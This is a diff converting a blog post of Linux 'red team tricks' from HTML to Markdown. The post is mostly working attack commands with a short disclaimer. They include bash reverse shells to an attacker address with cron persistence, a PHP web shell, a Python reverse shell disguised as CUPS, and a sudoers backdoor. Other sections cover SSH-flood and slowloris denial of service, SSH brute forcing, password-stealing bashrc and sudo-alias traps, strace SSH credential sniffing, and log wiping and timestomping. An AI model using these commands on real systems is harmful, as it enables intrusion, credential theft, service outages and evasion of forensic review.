@@ -16,75 +16,123 @@ tags:
 - Ubuntu 16.04
 permalink: "/2019/red-team-tricks-with-linux/"
 ---
-<p>I have collected some Linux commands and tricks that Red Team can use for their evil deeds. All these commands and tricks have been tested against Ubuntu 16.04 server and attackers computer is Kali Linux 2019.3.</p>
-<h2>Legal disclaimer</h2>
-<p>The methods are presented for educational purposes only.<br />
-<strong>You are responsible</strong> for not using the techniques for <strong>illegal purposes</strong>.</p>
-<h2>Label meanings</h2>
-<p><strong>[victim ip address]</strong> means add your target IP address example 127.0.0.1<br />
-<strong>[victim ip address zone]</strong> means add your target IP address zone example 10.1.1.0/24<br />
-<strong>[decoy ip address]</strong> means add a decoy address that you want to frame to be the attacker example 127.0.0.2<br />
-<strong>[domain]</strong> means add a victim domain example localhost<br />
-<strong>[username]</strong> means add a username example admin<br />
-<strong>[attacker domain]</strong> means add a hostile computer's ip address example 127.0.0.3<br />
-<strong>[target folder/file]</strong> means add a target folder or file that you want to change example /home/username/newfile<br />
-<strong>[source folder/file]</strong> means add a source folder or file that you want to use as reference example /bin</p>
-<h1>Scanning and denying</h1>
-<h2>Nmap</h2>
-<p>Nmap is a network scanning tool.</p>
-<p>Scan 1000 most common ports. Delay is about 1 second.</p>
+I have collected some Linux commands and tricks that Red Team can use for their evil deeds. All these commands and tricks have been tested against Ubuntu 16.04 server and attackers computer is Kali Linux 2019.3.
+
+## Legal disclaimer
+
+The methods are presented for educational purposes only.  
+**You are responsible** for not using the techniques for **illegal purposes**.
+
+## Label meanings
+
+**[victim ip address]** means add your target IP address example 127.0.0.1  
+**[victim ip address zone]** means add your target IP address zone example 10.1.1.0/24  
+**[decoy ip address]** means add a decoy address that you want to frame to be the attacker example 127.0.0.2  
+**[domain]** means add a victim domain example localhost  
+**[username]** means add a username example admin  
+**[attacker domain]** means add a hostile computer's ip address example 127.0.0.3  
+**[target folder/file]** means add a target folder or file that you want to change example /home/username/newfile  
+**[source folder/file]** means add a source folder or file that you want to use as reference example /bin
+
+# Scanning and denying
+
+## Nmap
+
+Nmap is a network scanning tool.
+
+Scan 1000 most common ports. Delay is about 1 second.
+
 <pre># nmap --top-ports 1000 -T2 [victim ip address]</pre>
-<p>Scan all ports aggressively</p>
+
+Scan all ports aggressively
+
 <pre># nmap -p- -T4 [victim ip address]</pre>
-<p>Try to determine Operation system. Scan 1000 most common ports and try to determine service and version.</p>
+
+Try to determine Operation system. Scan 1000 most common ports and try to determine service and version.
+
 <pre># nmap -O -sV --top-ports 1000 -T4 [victim ip address]</pre>
-<p>Scan insane fast in parallel and use decoys. In a target computer it looks like 3 different IP addresses are trying to scan it ports.</p>
+
+Scan insane fast in parallel and use decoys. In a target computer it looks like 3 different IP addresses are trying to scan it ports.
+
 <pre># nmap -p- -T5 --min-parallelism 5 [victim ip address zone] -D[decoy ip address],[decoy ip address]</pre>
-<h2>Hydra</h2>
-<p>Hydra is a brute force tool.</p>
-<p>Brute forcing SSH account. Try to brute force 4 length password that contains only letters a and o. Delay is 1 second. Brute forcing is stopped if correct username and password is found.</p>
+
+## Hydra
+
+Hydra is a brute force tool.
+
+Brute forcing SSH account. Try to brute force 4 length password that contains only letters a and o. Delay is 1 second. Brute forcing is stopped if correct username and password is found.
+
 <pre># hydra -f -t 1 -l [username] -V -x 4:4:ao [victim ip address] ssh</pre>
-<h2>Slowhttptest</h2>
-<p>Slowlori attack is opening connections to HTTP server and keeps connections open. This makes web server to be very slow or unreachable.</p>
-<p>Open 1000 connection and send only unfinished HTTP requests. Open 200 new connections per second and keep connections open by sending GET method in every 10 second with maximum length of 24 and wait 3 seconds for response.</p>
+
+## Slowhttptest
+
+Slowlori attack is opening connections to HTTP server and keeps connections open. This makes web server to be very slow or unreachable.
+
+Open 1000 connection and send only unfinished HTTP requests. Open 200 new connections per second and keep connections open by sending GET method in every 10 second with maximum length of 24 and wait 3 seconds for response.
+
 <pre># slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://[victim ip address or domain] -x 24 -p 3</pre>
-<h2>DOS</h2>
-<p>Take lot of TCP connections to target</p>
+
+## DOS
+
+Take lot of TCP connections to target
+
 <pre># nping --tcp-connect --rate=1000000 --count 1000000 [victim ip address or domain]</pre>
-<p>Send much as possible TCP connections to target to port 21 and change source address to a decoy IP address. Flood by sending 10000 packets using SYN flag and data size is 120.</p>
+
+Send much as possible TCP connections to target to port 21 and change source address to a decoy IP address. Flood by sending 10000 packets using SYN flag and data size is 120.
+
 <pre>$ sudo hping3 -V -c 10000 -d 120 -S -p 21 --flood [victim ip address] -a [decoy ip address]</pre>
-<h1>Reverse shells</h1>
-<h2>Bash reverse shell</h2>
-<p>In attacker's computer listen 51920 port using Netcat</p>
+
+# Reverse shells
+
+## Bash reverse shell
+
+In attacker's computer listen 51920 port using Netcat
+
 <pre># nc -l -p 51920</pre>
-<p>Victim is connecting to attacker and opening reverse shell</p>
-<pre># /bin/bash -i &gt;&amp; /dev/tcp/[attacker ip address]/51920 0&gt;&amp;1</pre>
-<p>You can also create a script that will try to open a reverse shell in every 5 minute</p>
+
+Victim is connecting to attacker and opening reverse shell
+
+<pre># /bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1</pre>
+
+You can also create a script that will try to open a reverse shell in every 5 minute
+
 <pre># nano /etc/cron.d/update_check
-*/5 * * * * root /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/[attacker ip address]/51920 0&gt;&amp;1'</pre>
-<h2>Reverse shell using PHP site</h2>
-<p>Install Apache and PHP to victim's computer and create PHP file that will open a reverse shell when the page is requested by HTTP protocol.</p>
+*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1'</pre>
+
+## Reverse shell using PHP site
+
+Install Apache and PHP to victim's computer and create PHP file that will open a reverse shell when the page is requested by HTTP protocol.
+
 <pre># apt install apache2 php libapache2-mod-php
 # adduser www-data sudo
 # passwd www-data
 
 # nano /var/www/html/example.php
-&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/" . $_GET["x"] . "/" . $_GET["y"] . " 0&gt;&amp;1'"); ?&gt;
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/" . $_GET["x"] . "/" . $_GET["y"] . " 0>&1'"); ?>
 
 # touch /var/www/html/example.php -r /var/www/html/index.html
 # service apache2 restart
 </pre>
-<p>In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site. With HTTP request the victim's computer will open the reverse shell</p>
+
+In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site. With HTTP request the victim's computer will open the reverse shell
+
 <pre># nc -l -p 51920
-# curl 'http://[victim ip address]/example.php?x=[attacker domain]&amp;y=51920'</pre>
-<p>This is how you can give password using only one line example in reverse shell</p>
+# curl 'http://[victim ip address]/example.php?x=[attacker domain]&y=51920'</pre>
+
+This is how you can give password using only one line example in reverse shell
+
 <pre>$ echo 'password' | sudo -S command
 </pre>
-<h2>Python site reverse shell and fake it to look like CUPS</h2>
-<p>Give a sudo rights to user nobody without need to give a password</p>
+
+## Python site reverse shell and fake it to look like CUPS
+
+Give a sudo rights to user nobody without need to give a password
+
 <pre># nano /etc/sudoers.d/nobody
 nobody ALL=(ALL) NOPASSWD:ALL</pre>
-<p>Fake Python to look like CUPS, create a Python script and start a Python server</p>
+
+Fake Python to look like CUPS, create a Python script and start a Python server
+
 <pre># python -V
 Python 2.7.12
 
@@ -105,30 +153,47 @@ p=subprocess.call(["/bin/bash","-i"]);
 # cd /var/www/
 # /usr/bin/cups -m CGIHTTPServer 631
 </pre>
-<p>If you would NMAP victim's computer with default options it would look like ipp(CUPS) service is running</p>
+
+If you would NMAP victim's computer with default options it would look like ipp(CUPS) service is running
+
 <pre># nmap -p 631 [victim ip address]
 PORT    STATE SERVICE
 631/tcp open  ipp
 </pre>
-<p>In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site</p>
+
+In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site
+
 <pre># nc -l -p 51920
 # curl 'http://[victim ip address]:631/cgi-bin/index.py'
 </pre>
-<h1>SSH tricks and stealing passwords</h1>
-<h2>SSH listening different port using reverse shell</h2>
-<p>Add PORT 2222 end of the /etc/ssh/sshd_config</p>
-<pre># echo PORT 2222 &gt;&gt; /etc/ssh/sshd_config</pre>
-<p>Restart SSH daemon</p>
+
+# SSH tricks and stealing passwords
+
+## SSH listening different port using reverse shell
+
+Add PORT 2222 end of the /etc/ssh/sshd_config
+
+<pre># echo PORT 2222 >> /etc/ssh/sshd_config</pre>
+
+Restart SSH daemon
+
 <pre># service ssh restart</pre>
-<p>Now you can take SSH to port 2222</p>
+
+Now you can take SSH to port 2222
+
 <pre># ssh [username]@[victim ip address] -p 2222</pre>
-<h2>SSH Public Key Authentication</h2>
-<p>Create key pair on hostile's computer, move public key to victim's computer and take SSH connection to it</p>
+
+## SSH Public Key Authentication
+
+Create key pair on hostile's computer, move public key to victim's computer and take SSH connection to it
+
 <pre># ssh-keygen
 # ssh-copy-id [username]@[victim ip address]
 # ssh [username]@[victim ip address]
 </pre>
-<p>On victim's computer modify sshd_config allow the root to login, change SSH to find public keys also from /etc/ssh/authorized_keys and move public key to that location.</p>
+
+On victim's computer modify sshd_config allow the root to login, change SSH to find public keys also from /etc/ssh/authorized_keys and move public key to that location.
+
 <pre># nano /etc/ssh/sshd_config
 PermitRootLogin yes
 AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys
@@ -140,48 +205,74 @@ AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys
 # touch /etc/ssh/sshd_config -r /srv
 # touch /etc/ssh/authorized_keys -r /srv
 </pre>
-<p>Now you can take SSH connection without password using root (or any other user) from hostile computer</p>
+
+Now you can take SSH connection without password using root (or any other user) from hostile computer
+
 <pre># ssh root@[victim ip address]
 </pre>
-<h2>Steal SSH password using bashrc</h2>
-<p>Modify bash.bashrc so it looks like first password went wrong and you need to write it again, but actually it steals victim's password and adds it to a file</p>
+
+## Steal SSH password using bashrc
+
+Modify bash.bashrc so it looks like first password went wrong and you need to write it again, but actually it steals victim's password and adds it to a file
+
 <pre># nano /etc/bash.bashrc</pre>
-<p>Add these line to end of the bash.bashrc file</p>
+
+Add these line to end of the bash.bashrc file
+
 <pre>clear
 echo "$(whoami)@$(hostname -I)'s password:"
 echo "Permission denied, please try again."
 read -s -p "$(whoami)@$(hostname -I)'s password: "  password
-echo "$password" &gt;&gt; /tmp/password.txt
+echo "$password" >> /tmp/password.txt
 echo   
 </pre>
-<h2>Sudo alias and steal sudo password</h2>
-<p><strong>This needs permanent solution to add alias and better way to do cut</strong><br />
-Create file that asks sudo password, runs the last command and steals the password and adds it to a file</p>
+
+## Sudo alias and steal sudo password
+
+**This needs permanent solution to add alias and better way to do cut**  
+Create file that asks sudo password, runs the last command and steals the password and adds it to a file
+
 <pre># nano /bin/admin
 read -s -p "[sudo] password for $(whoami): "  password
 echo
-echo $password &gt;&gt; /tmp/sudo_password.txt
+echo $password >> /tmp/sudo_password.txt
 echo $password | /usr/bin/sudo -S $(history 1 | cut -c 13-)  
 </pre>
-<p>Give execute permissions to that file and give the script to sudo alias</p>
+
+Give execute permissions to that file and give the script to sudo alias
+
 <pre># chmod +rx /bin/admin
 # alias sudo="/bin/admin"
 </pre>
-<p>Now every time victim is running sudo [command] script asks password, steals the password and runs the command what victim wanted to run.</p>
-<p>After this we can hide this alias modification by modifying the alias command</p>
-<pre># alias &gt; /bin/alias_old
+
+Now every time victim is running sudo [command] script asks password, steals the password and runs the command what victim wanted to run.
+
+After this we can hide this alias modification by modifying the alias command
+
+<pre># alias > /bin/alias_old
 # alias alias="cat /bin/alias_old"
 </pre>
-<h1>Cleaning your evil deeds</h1>
-<h2>Erasing history</h2>
-<p>Remove old history</p>
+
+# Cleaning your evil deeds
+
+## Erasing history
+
+Remove old history
+
 <pre># rm -r ~/.bash_history</pre>
-<p>Clean session history and exit</p>
-<pre># history -c &amp;&amp; exit</pre>
-<p>Link history to /dev/null so history does not save anything</p>
+
+Clean session history and exit
+
+<pre># history -c && exit</pre>
+
+Link history to /dev/null so history does not save anything
+
 <pre># ln -sf /dev/null ~/.bash_history</pre>
-<h2>Clean logs</h2>
-<p>Delete all useful log files</p>
+
+## Clean logs
+
+Delete all useful log files
+
 <pre># rm -r /var/log/apache2
 # rm -r /var/log/apt
 # rm /var/log/mail*
@@ -189,71 +280,110 @@ echo $password | /usr/bin/sudo -S $(history 1 | cut -c 13-)
 # rm /var/log/syslog*
 # rm /var/log/auth*
 </pre>
-<h2>Folder and File time modifications</h2>
-<p>Check a folder or a file creation and modification time</p>
+
+## Folder and File time modifications
+
+Check a folder or a file creation and modification time
+
 <pre># stat [target folder/file]</pre>
-<p>Change a folder or a file creation and modification time to YYYYMMDDhhmm</p>
+
+Change a folder or a file creation and modification time to YYYYMMDDhhmm
+
 <pre># touch -t 201212211111 [target folder/file]</pre>
-<p>Change a folder or a file modification time to YYYYMMDDhhmm</p>
+
+Change a folder or a file modification time to YYYYMMDDhhmm
+
 <pre># touch -mt 201212211111 [target folder/file]</pre>
-<p>Copy creation and modification time from other file or folder</p>
+
+Copy creation and modification time from other file or folder
+
 <pre># touch [target folder/file] -r [source folder/file]</pre>
-<p>List all files that has been changed in 7 days</p>
+
+List all files that has been changed in 7 days
+
 <pre># find [target folder] -iname "*" -atime -7 -type f</pre>
-<p>List all folders that has been changed in 7 days</p>
+
+List all folders that has been changed in 7 days
+
 <pre># find [target folder] -iname "*" -atime -7 -type d</pre>
-<p>Change creation and modification time for all files that has been modified in 7 days</p>
+
+Change creation and modification time for all files that has been modified in 7 days
+
 <pre># touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type f)</pre>
-<p>Change creation and modification time for all folders that has been modified in 7 days</p>
+
+Change creation and modification time for all folders that has been modified in 7 days
+
 <pre># touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type d)</pre>
-<p>Copy creation and modification time for all files that has been modified in 7 days. Source folder could be something like /bin</p>
+
+Copy creation and modification time for all files that has been modified in 7 days. Source folder could be something like /bin
+
 <pre># touch $(find [target folder] -iname "*" -atime -7 -type f) -r [source folder/file]</pre>
-<h1>*******************************</h1>
-<h1>UNDER THIS DOES NOT WORK YEAT</h1>
-<h1>*******************************</h1>
-<h2>Get SSH credentials using strace</h2>
+
+# *******************************
+
+# UNDER THIS DOES NOT WORK YEAT
+
+# *******************************
+
+## Get SSH credentials using strace
+
 <pre>$ sudo strace -f -p $(pgrep -o sshd) -o sniff.txt -e trace=write
-$ sudo /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep '\\0\\0\\0\\4\|\\0\\0\\0\\10'
-$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep --line-buffered '\\0\\0\\0\\5\|\\0\\0\\0\\10' &gt;&gt; tiedosto.txt
-$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' &gt;&gt; tiedosto.txt
-$ (/usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' &gt;&gt; /var/gnome.1) &amp;
+$ sudo /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep '\\0\\0\\0\\4\|\\0\\0\\0\\10'
+$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered '\\0\\0\\0\\5\|\\0\\0\\0\\10' >> tiedosto.txt
+$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> tiedosto.txt
+$ (/usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> /var/gnome.1) &
 </pre>
-<p>strace with reverse shell</p>
+
+strace with reverse shell
+
 <pre>$ sed -i -e 's/KillMode=process/KillMode=process\nExecStartPost=\/etc\/systemd\/system\/sshd.sh/g' /lib/systemd/system/ssh.service
-$ printf '#!/bin/bash\n/usr/bin/strace -f -p $MAINPID -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e ' &gt; /etc/systemd/system/sshd.sh
-$ echo "'\\\\0\\\\0\\\\0\\\\10' &gt;&gt; /var/gnome.1 &amp;" &gt;&gt; /etc/systemd/system/sshd.sh
+$ printf '#!/bin/bash\n/usr/bin/strace -f -p $MAINPID -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e ' > /etc/systemd/system/sshd.sh
+$ echo "'\\\\0\\\\0\\\\0\\\\10' >> /var/gnome.1 &" >> /etc/systemd/system/sshd.sh
 
 $ chmod +x /etc/systemd/system/sshd.sh
 $ systemctl daemon-reload
 $ service ssh restart
 </pre>
-<p>strace with ssh</p>
+
+strace with ssh
+
 <pre>$ sudoedit /lib/systemd/system/ssh.service
 ExecStartPost=/etc/systemd/system/sshd.sh
 
 $ sudoedit /etc/systemd/system/sshd.sh
 #!/bin/bash
-(/usr/bin/strace -f -p $MAINPID -e trace=write 2&gt;&amp;1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' &gt;&gt; /var/gnome.1) &amp;
+(/usr/bin/strace -f -p $MAINPID -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> /var/gnome.1) &
 
 $ chmod +x /etc/systemd/system/sshd.sh
 $ systemctl daemon-reload
 $ service ssh restart
 </pre>
-<p>grepping the password and username</p>
+
+grepping the password and username
+
 <pre>$ cat sniff.txt | cut -d ' ' -f 4 | sort | uniq -c | sort -nr
 $ grep '\\0\\0\\0\\10' sniff.txt
 käyttäjä
 $ grep '\\0\\0\\0\\4' sniff.txt
 $ grep '@computer' sniff.txt
 </pre>
-<h2>DNS tunneling</h2>
+
+## DNS tunneling
+
 <pre>$ apt-get install iodine</pre>
-<p>Server to listen</p>
+
+Server to listen
+
 <pre># iodined -f -P 12345 [target ip address] [hostile domain]</pre>
-<p>Client</p>
+
+Client
+
 <pre>$ sudo iodine -f -P 12345 -r [hostile domain]</pre>
-<h2>SPAM mail</h2>
-<h2>Windows create traffic using curl</h2>
+
+## SPAM mail
+
+## Windows create traffic using curl
+
 <pre>set list=http://localhost1 http://localhost2
 set list2=http://localhost3 http://localhost3
 
@@ -276,5 +406,6 @@ REM Firefox
 
 goto loop
 </pre>
-<p>https://linux.die.net/man/1/knockd<br />
-AXFR query using tcp connection to port 53</p>
+
+https://linux.die.net/man/1/knockd  
+AXFR query using tcp connection to port 53
